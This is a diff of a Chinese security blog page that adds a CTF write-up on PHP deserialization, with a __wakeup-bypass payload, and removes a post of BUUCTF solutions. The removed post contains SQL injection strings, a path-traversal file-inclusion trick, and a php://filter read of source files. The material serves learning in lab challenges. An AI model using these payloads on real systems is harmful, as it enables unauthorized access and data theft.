@@ -255,6 +255,97 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-cn">
+    <link itemprop="mainEntityOfPage" href="https://wanheiqiyihu.top/2022/01/19/%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%91%E5%BA%8F%E5%88%97%E5%8C%96-%E7%BB%95%E8%BF%87-weakup/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="十三">
+      <meta itemprop="description" content="潜心学习，不骄不躁">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="十三の博客">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2022/01/19/%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%91%E5%BA%8F%E5%88%97%E5%8C%96-%E7%BB%95%E8%BF%87-weakup/" class="post-title-link" itemprop="url">序列化与发序列化 绕过__weakup()</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2022-01-19 15:01:42 / 修改时间：15:03:06" itemprop="dateCreated datePublished" datetime="2022-01-19T15:01:42+08:00">2022-01-19</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Experience/" itemprop="url" rel="index"><span itemprop="name">-Experience</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h1 id="序列化与发序列化"><a href="#序列化与发序列化" class="headerlink" title="序列化与发序列化"></a>序列化与发序列化</h1><h1 id="php"><a href="#php" class="headerlink" title="php"></a>php</h1><h2 id="1-1前置知识"><a href="#1-1前置知识" class="headerlink" title="1.1前置知识"></a>1.1前置知识</h2><p>反序列化的对象是类与对象</p>
+<h3 id="1-1-1常用的一些魔术方法"><a href="#1-1-1常用的一些魔术方法" class="headerlink" title="1.1.1常用的一些魔术方法"></a>1.1.1常用的一些魔术方法</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">__wakeup() //执行unserialize()时，先会调用这个函数</span><br><span class="line">__sleep() //执行serialize()时，先会调用这个函数</span><br><span class="line">__destruct() //对象被销毁时触发</span><br><span class="line">__call() //在对象上下文中调用不可访问的方法时触发</span><br><span class="line">__callStatic() //在静态上下文中调用不可访问的方法时触发</span><br><span class="line">__get() //用于从不可访问的属性读取数据或者不存在这个键都会调用此方法</span><br><span class="line">__set() //用于将数据写入不可访问的属性</span><br><span class="line">__isset() //在不可访问的属性上调用isset()或empty()触发</span><br><span class="line">__unset() //在不可访问的属性上使用unset()时触发</span><br><span class="line">__toString() //把类当作字符串使用时触发</span><br><span class="line">__invoke() //当尝试将对象调用为函数时触发</span><br><span class="line">__construct()//创建对象的时候使用</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="1-1-2相关函数"><a href="#1-1-2相关函数" class="headerlink" title="1.1.2相关函数"></a>1.1.2相关函数</h3><p><code>unserialize()</code>将传入字符串反序列化。</p>
+<p><code>serialize()</code>将传入变量序列化。</p>
+<p>与之类似于还有:<code>json_encode</code>和<code>json_decode</code></p>
+<h3 id="1-1-3序列化与反序列化"><a href="#1-1-3序列化与反序列化" class="headerlink" title="1.1.3序列化与反序列化"></a>1.1.3序列化与反序列化</h3><p>序列化是将任意类型的变量以特定的规则转换成一串字符串，可以用更少的空间保存对象里的信息，便于传输；反序列化则是根据规则还原字符串所对应的变量；</p>
+<p>如果变量类型是<code>protected</code>，则会在变量名前加上<code>%00*%00</code>,<code>private</code>则会在变量名前加上<code>%00类名%00</code>（这里不可见字符要用url编码表示）</p>
+<h3 id="1-1-4格式"><a href="#1-1-4格式" class="headerlink" title="1.1.4格式"></a>1.1.4格式</h3><p><img src="/2022/01/19/%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%91%E5%BA%8F%E5%88%97%E5%8C%96-%E7%BB%95%E8%BF%87-weakup/image-20220119132735454.png" alt="image-20220119132735454"></p>
+<p><img src="/2022/01/19/%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%91%E5%BA%8F%E5%88%97%E5%8C%96-%E7%BB%95%E8%BF%87-weakup/image-20220119132752202.png" alt="image-20220119132752202"></p>
+<h1 id="2-常见的绕过"><a href="#2-常见的绕过" class="headerlink" title="2.常见的绕过"></a>2.常见的绕过</h1><p>[(33条消息) <a target="_blank" rel="noopener" href="https://blog.csdn.net/solitudi/article/details/113588692?utm_source=app&app_version=4.16.0">CTF]PHP反序列化总结_Y4tacker的博客-CSDN博客_php反序列化</a></p>
+<h1 id="3-找点题"><a href="#3-找点题" class="headerlink" title="3.找点题"></a>3.找点题</h1><h2 id="极客大挑战-2019-PHP"><a href="#极客大挑战-2019-PHP" class="headerlink" title="[极客大挑战 2019]PHP"></a>[极客大挑战 2019]PHP</h2><p>访问<a target="_blank" rel="noopener" href="http://www.zip拿到源码/">www.zip拿到源码</a></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Name</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$username</span> = <span class="string">&#x27;nonono&#x27;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$password</span> = <span class="string">&#x27;yesyes&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$username</span>,<span class="variable">$password</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;username = <span class="variable">$username</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;password = <span class="variable">$password</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;username = <span class="string">&#x27;guest&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;password != <span class="number">100</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;NO!!!hacker!!!&lt;/br&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;You name is: &quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;username;<span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;You password is: &quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;password;<span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">die</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;username === <span class="string">&#x27;admin&#x27;</span>) &#123;</span><br><span class="line">            <span class="keyword">global</span> <span class="variable">$flag</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;hello my friend~~&lt;/br&gt;sorry i can&#x27;t give you the flag!&quot;</span>;</span><br><span class="line">            <span class="keyword">die</span>();</span><br><span class="line"></span><br><span class="line">            </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span><span class="comment">//class.php</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="keyword">include</span> <span class="string">&#x27;class.php&#x27;</span>;</span><br><span class="line">  <span class="variable">$select</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;select&#x27;</span>];</span><br><span class="line">  <span class="variable">$res</span>=unserialize(@<span class="variable">$select</span>);</span><br><span class="line">  <span class="meta">?&gt;</span></span><br><span class="line">   <span class="comment">//index.php</span></span><br></pre></td></tr></table></figure>
+
+<p>index.php ，会调用class.php，以及对输入反序列化</p>
+<p>然后因为要绕过wakeup,把Name后的数字改成3.因为username和password是私有变量，变量中的类名前后会有空白符，而复制的时候会丢失，所以要加上%00</p>
+<p>最后payload:</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:<span class="number">4</span>:<span class="string">&quot;Name&quot;</span>:<span class="number">3</span>：&#123;s:<span class="number">14</span>:<span class="string">&quot;%00Name%00username&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;admin&quot;</span>;s:<span class="number">14</span>:<span class="string">&quot;%00Name%00password&quot;</span>;i:<span class="number">100</span>;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>提交得到flag</p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-cn">
     <link itemprop="mainEntityOfPage" href="https://wanheiqiyihu.top/2022/01/17/BUUCTF%E5%88%B7%E9%A2%98%E6%97%A5%E5%BF%972/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -513,192 +604,6 @@
   
   
 
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-cn">
-    <link itemprop="mainEntityOfPage" href="https://wanheiqiyihu.top/2022/01/15/BUUCTF-%E7%9A%84%E4%B8%80%E4%BA%9B%E7%AD%BE%E5%88%B0%E9%A2%98-%E5%86%85%E6%9C%89sql-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-%E5%86%85%E8%81%94/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="十三">
-      <meta itemprop="description" content="潜心学习，不骄不躁">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="十三の博客">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2022/01/15/BUUCTF-%E7%9A%84%E4%B8%80%E4%BA%9B%E7%AD%BE%E5%88%B0%E9%A2%98-%E5%86%85%E6%9C%89sql-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-%E5%86%85%E8%81%94/" class="post-title-link" itemprop="url">BUUCTF 的一些签到题 内有sql 命令执行(内联)</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-              
-
-              <time title="创建时间：2022-01-15 16:48:00 / 修改时间：16:53:18" itemprop="dateCreated datePublished" datetime="2022-01-15T16:48:00+08:00">2022-01-15</time>
-            </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/Experience/" itemprop="url" rel="index"><span itemprop="name">-Experience</span></a>
-                </span>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h1 id="BUUCTF-的一些签到题-内有sql-命令执行"><a href="#BUUCTF-的一些签到题-内有sql-命令执行" class="headerlink" title="BUUCTF 的一些签到题 内有sql 命令执行"></a>BUUCTF 的一些签到题 内有sql 命令执行</h1><h2 id="第一题-easy-sql"><a href="#第一题-easy-sql" class="headerlink" title="第一题 easy sql"></a>第一题 easy sql</h2><p><img src="/2022/01/15/BUUCTF-%E7%9A%84%E4%B8%80%E4%BA%9B%E7%AD%BE%E5%88%B0%E9%A2%98-%E5%86%85%E6%9C%89sql-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-%E5%86%85%E8%81%94/image-20220115110256458.png" alt="image-20220115110256458"></p>
-<p>直接在admin那里用’’ or 1=1#</p>
-<p>密码那也可以’’ or 1=1#  记得#要用%23</p>
-<p><img src="/2022/01/15/BUUCTF-%E7%9A%84%E4%B8%80%E4%BA%9B%E7%AD%BE%E5%88%B0%E9%A2%98-%E5%86%85%E6%9C%89sql-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-%E5%86%85%E8%81%94/image-20220115110523694.png" alt="image-20220115110523694"></p>
-<h2 id="第二题-php-代码审计"><a href="#第二题-php-代码审计" class="headerlink" title="第二题 php 代码审计"></a>第二题 php 代码审计</h2><p>打开看源代码发现提示</p>
-<p><img src="/2022/01/15/BUUCTF-%E7%9A%84%E4%B8%80%E4%BA%9B%E7%AD%BE%E5%88%B0%E9%A2%98-%E5%86%85%E6%9C%89sql-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-%E5%86%85%E8%81%94/image-20220115110631989.png" alt="image-20220115110631989"></p>
-<p>打开提示得到一串源码</p>
-<p><img src="/2022/01/15/BUUCTF-%E7%9A%84%E4%B8%80%E4%BA%9B%E7%AD%BE%E5%88%B0%E9%A2%98-%E5%86%85%E6%9C%89sql-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-%E5%86%85%E8%81%94/image-20220115110716784.png" alt="image-20220115110716784"></p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">emmm</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">checkFile</span>(<span class="params">&amp;<span class="variable">$page</span></span>)</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="comment">//白名单列表</span></span><br><span class="line">            <span class="variable">$whitelist</span> = [<span class="string">&quot;source&quot;</span>=&gt;<span class="string">&quot;source.php&quot;</span>,<span class="string">&quot;hint&quot;</span>=&gt;<span class="string">&quot;hint.php&quot;</span>];</span><br><span class="line">            <span class="comment">//isset()判断变量是否声明is_string()判断变量是否是字符串 &amp;&amp;用了逻辑与两个值都为真才执行if里面的值</span></span><br><span class="line">            <span class="keyword">if</span> (! <span class="keyword">isset</span>(<span class="variable">$page</span>) || !is_string(<span class="variable">$page</span>)) &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;you can&#x27;t see it A&quot;</span>;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">//检测传进来的值是否匹配白名单列表$whitelist 如果有则执行真</span></span><br><span class="line">            <span class="keyword">if</span> (in_array(<span class="variable">$page</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">//过滤问号的函数(如果$page的值有？则从?之前提取字符串)</span></span><br><span class="line">            <span class="variable">$_page</span> = mb_substr(</span><br><span class="line">                <span class="variable">$page</span>,</span><br><span class="line">                <span class="number">0</span>,</span><br><span class="line">                mb_strpos(<span class="variable">$page</span> . <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;?&#x27;</span>)<span class="comment">//返回$page.?里卖弄?号出现的第一个位置</span></span><br><span class="line">            );</span><br><span class="line"></span><br><span class="line">             <span class="comment">//第二次检测传进来的值是否匹配白名单列表$whitelist 如果有则执行真</span></span><br><span class="line">            <span class="keyword">if</span> (in_array(<span class="variable">$_page</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">//url对$page解码</span></span><br><span class="line">            <span class="variable">$_page</span> = urldecode(<span class="variable">$page</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">//第二次过滤问号的函数(如果$page的值有？则从?之前提取字符串)</span></span><br><span class="line">            <span class="variable">$_page</span> = mb_substr(</span><br><span class="line">                <span class="variable">$_page</span>,</span><br><span class="line">                <span class="number">0</span>,</span><br><span class="line">                mb_strpos(<span class="variable">$_page</span> . <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;?&#x27;</span>)</span><br><span class="line">            );</span><br><span class="line">            <span class="comment">//第三次检测传进来的值是否匹配白名单列表$whitelist 如果有则执行真</span></span><br><span class="line">            <span class="keyword">if</span> (in_array(<span class="variable">$_page</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;you can&#x27;t see it&quot;</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
-
-<p>在源码中发现了一个hint.php去看一下</p>
-<p><img src="/2022/01/15/BUUCTF-%E7%9A%84%E4%B8%80%E4%BA%9B%E7%AD%BE%E5%88%B0%E9%A2%98-%E5%86%85%E6%9C%89sql-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-%E5%86%85%E8%81%94/image-20220115111610174.png" alt="image-20220115111610174"></p>
-<p>得到提示</p>
-<p>根据我们的审计，首先我们要传参file，是字符串类型，然后让函数checkfile返回为真。</p>
-<p>hint.php?../../../../../ffffllllaaaagggg 我们可以想象他传入checkFile函数要经历 第一次白名单验证 一次？过滤后他就是hint.php 再进行一次白名单验证 返回为真 则达成条件进行包含得到flag</p>
-<p><img src="/2022/01/15/BUUCTF-%E7%9A%84%E4%B8%80%E4%BA%9B%E7%AD%BE%E5%88%B0%E9%A2%98-%E5%86%85%E6%9C%89sql-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-%E5%86%85%E8%81%94/image-20220115113729499.png" alt="image-20220115113729499"></p>
-<h2 id="第三题-简单小题"><a href="#第三题-简单小题" class="headerlink" title="第三题 简单小题"></a>第三题 简单小题</h2><p>在源代码中有个注释</p>
-<p><img src="/2022/01/15/BUUCTF-%E7%9A%84%E4%B8%80%E4%BA%9B%E7%AD%BE%E5%88%B0%E9%A2%98-%E5%86%85%E6%9C%89sql-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-%E5%86%85%E8%81%94/image-20220115113908245.png" alt="image-20220115113908245"></p>
-<p>传参cat=dog得到flag</p>
-<p><img src="/2022/01/15/BUUCTF-%E7%9A%84%E4%B8%80%E4%BA%9B%E7%AD%BE%E5%88%B0%E9%A2%98-%E5%86%85%E6%9C%89sql-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-%E5%86%85%E8%81%94/image-20220115113926285.png" alt="image-20220115113926285"></p>
-<h2 id="第四题-文件包含伪协议"><a href="#第四题-文件包含伪协议" class="headerlink" title="第四题 文件包含伪协议"></a>第四题 文件包含伪协议</h2><p>先查一下伪协议的使用 有点忘了</p>
-<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_45588247/article/details/119348342">(32条消息) 【文件包含漏洞】——文件包含漏洞进阶_PHP伪协议_剑客 getshell的博客-CSDN博客</a></p>
-<p><img src="/2022/01/15/BUUCTF-%E7%9A%84%E4%B8%80%E4%BA%9B%E7%AD%BE%E5%88%B0%E9%A2%98-%E5%86%85%E6%9C%89sql-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-%E5%86%85%E8%81%94/image-20220115114717651.png" alt="image-20220115114717651"></p>
-<p>打开题目是这样的</p>
-<p>然后就用?file=php://filter/read=convert.base64-encode/resource=./flag.php</p>
-<p><img src="/2022/01/15/BUUCTF-%E7%9A%84%E4%B8%80%E4%BA%9B%E7%AD%BE%E5%88%B0%E9%A2%98-%E5%86%85%E6%9C%89sql-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-%E5%86%85%E8%81%94/image-20220115114822119.png" alt="image-20220115114822119"></p>
-<p>然后就base64解密</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Can you find out the flag?&quot;</span>;</span><br><span class="line"><span class="comment">//flag&#123;8888b971-6d8f-4507-892a-eddd64932264&#125;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<h2 id="第五题-强网杯随便注-经典题目了"><a href="#第五题-强网杯随便注-经典题目了" class="headerlink" title="第五题 强网杯随便注 经典题目了"></a>第五题 强网杯随便注 经典题目了</h2><p><img src="/2022/01/15/BUUCTF-%E7%9A%84%E4%B8%80%E4%BA%9B%E7%AD%BE%E5%88%B0%E9%A2%98-%E5%86%85%E6%9C%89sql-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-%E5%86%85%E8%81%94/image-20220115115110263.png" alt="image-20220115115110263"></p>
-<p>堆叠注入</p>
-<p>然后预处理和大小写绕过selct与prepare，set</p>
-<p><img src="/2022/01/15/BUUCTF-%E7%9A%84%E4%B8%80%E4%BA%9B%E7%AD%BE%E5%88%B0%E9%A2%98-%E5%86%85%E6%9C%89sql-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-%E5%86%85%E8%81%94/image-20220115121839028.png" alt="image-20220115121839028"></p>
-<h2 id="第六题-sql注入"><a href="#第六题-sql注入" class="headerlink" title="第六题 sql注入"></a>第六题 sql注入</h2><p><img src="/2022/01/15/BUUCTF-%E7%9A%84%E4%B8%80%E4%BA%9B%E7%AD%BE%E5%88%B0%E9%A2%98-%E5%86%85%E6%9C%89sql-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-%E5%86%85%E8%81%94/image-20220115122524341.png" alt="image-20220115122524341"></p>
-<p>输入1有回显，试了下堆叠注入。</p>
-<p><img src="/2022/01/15/BUUCTF-%E7%9A%84%E4%B8%80%E4%BA%9B%E7%AD%BE%E5%88%B0%E9%A2%98-%E5%86%85%E6%9C%89sql-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-%E5%86%85%E8%81%94/image-20220115122558307.png" alt="image-20220115122558307"></p>
-<p><img src="/2022/01/15/BUUCTF-%E7%9A%84%E4%B8%80%E4%BA%9B%E7%AD%BE%E5%88%B0%E9%A2%98-%E5%86%85%E6%9C%89sql-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-%E5%86%85%E8%81%94/image-20220115122647147.png" alt="image-20220115122647147"></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">但是要用select的时候返回了nonono，说明select关键字又被过滤了，那再试一下预处理。</span><br><span class="line"></span><br><span class="line">也不行，麻了，我是真的菜狗啊。</span><br></pre></td></tr></table></figure>
-
-<p>然后就去看别人的wp</p>
-<p>(≧∇≦)ﾉ顺便偷了个葵花宝典</p>
-<p><img src="/2022/01/15/BUUCTF-%E7%9A%84%E4%B8%80%E4%BA%9B%E7%AD%BE%E5%88%B0%E9%A2%98-%E5%86%85%E6%9C%89sql-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-%E5%86%85%E8%81%94/1658967-20200622120028704-1362680601.png" alt="img"></p>
-<p>别人的wp：</p>
-<p>这道题目需要我们去对后端语句进行猜测，有点矛盾的地方在于其描述的功能和实际的功能似乎并不相符，通过输入非零数字得到的回显1和输入其余字符得不到回显来判断出内部的查询语句可能存在有||，也就是select 输入的数据||内置的一个列名 from 表名，进一步进行猜测即为select post进去的数据||flag from Flag(含有数据的表名，通过堆叠注入可知)，需要注意的是，此时的||起到的作用是or的作用</p>
-<p>解法1</p>
-<p>输入的内容为*,1</p>
-<p>内置的sql语句为sql=”select”.sql=”select”.post[‘query’].”||flag from Flag”;</p>
-<p>如果$post[‘query’]的数据为*,1，sql语句就变成了select *,1||flag from Flag，也就是select *,1 from Flag，也就是直接查询出了Flag表中的所有内容</p>
-<p>解法2</p>
-<p>输入的内容为1;set sql_mode=pipes_as_concat;select 1</p>
-<p>其中set sql_mode=pipes_as_concat的作用是将||的作用由or变为拼接字符串</p>
-<h2 id="第七题-命令执行漏洞"><a href="#第七题-命令执行漏洞" class="headerlink" title="第七题 命令执行漏洞"></a>第七题 命令执行漏洞</h2><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/happystudyhuan/p/11458455.html">命令执行漏洞 - 再简单一点点 - 博客园 (cnblogs.com)</a></p>
-<p><img src="/2022/01/15/BUUCTF-%E7%9A%84%E4%B8%80%E4%BA%9B%E7%AD%BE%E5%88%B0%E9%A2%98-%E5%86%85%E6%9C%89sql-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-%E5%86%85%E8%81%94/image-20220115143436249.png" alt="image-20220115143436249"></p>
-<h2 id="第八题-伪协议"><a href="#第八题-伪协议" class="headerlink" title="第八题 伪协议"></a>第八题 伪协议</h2><p>在源码中发现了一个文件，前去看看</p>
-<p><img src="/2022/01/15/BUUCTF-%E7%9A%84%E4%B8%80%E4%BA%9B%E7%AD%BE%E5%88%B0%E9%A2%98-%E5%86%85%E6%9C%89sql-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-%E5%86%85%E8%81%94/BUUCTF-%E7%9A%84%E4%B8%80%E4%BA%9B%E7%AD%BE%E5%88%B0%E9%A2%98-%E5%86%85%E6%9C%89sql-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-%E5%86%85%E8%81%94%5Cimage-20220115144300054.png" alt="image-20220115144300054"></p>
-<p><img src="/2022/01/15/BUUCTF-%E7%9A%84%E4%B8%80%E4%BA%9B%E7%AD%BE%E5%88%B0%E9%A2%98-%E5%86%85%E6%9C%89sql-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-%E5%86%85%E8%81%94/image-20220115145927816.png" alt="image-20220115145927816"></p>
-<p>抓包发现新东西</p>
